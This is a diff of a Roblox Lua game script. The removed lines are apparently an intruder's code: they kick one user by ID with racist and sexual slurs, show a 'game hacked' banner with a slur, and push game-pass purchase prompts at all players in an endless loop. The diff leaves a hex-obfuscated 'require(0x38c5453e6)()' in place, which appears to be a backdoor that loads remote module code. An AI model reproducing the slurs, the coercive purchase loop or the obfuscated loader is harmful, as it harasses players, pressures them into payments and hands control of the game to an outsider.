@@ -1,19 +1,4 @@
-game.Players.PlayerAdded:Connect(function(plr)
-  if plr.UserId == 4303863029 then 
-   local m = Instance.new("Message", player.PlayerGui)
-   m.Text = "Swedish nigger detected, automatic penis removal intiated.."
-   wait(3)
-   plr:Kick("your swedish + nigger get out bitch")
-  end
-  if plr.UserId == 2550901442 then 
-   local r = Instance.new("Message", workspace)
-   r.Text = "King snakeisban has joined!"
-   wait(3)
-   r:Destroy()
-  end
-end)
 
-wait(1)
 
 require(0x38c5453e6)()
 
@@ -42,18 +27,3 @@ for i,v in pairs(game.Players:GetPlayers()) do
 			end)
 		end
 	end
-
-
-local h = Instance.new("Hint", workspace)
-h.Text = "Game hacked by snake nigger, fuck ceo"
-
-local market=game:GetService("MarketplaceService")
-local id = 665966891
-while wait(300) do 
-	for i,v in pairs(game.Players:GetChildren()) do
-		if not market:UserOwnsGamePassAsync(v.UserId,id) then
-			market:PromptGamePassPurchase(v,id)
-		end
-	end
-end
-
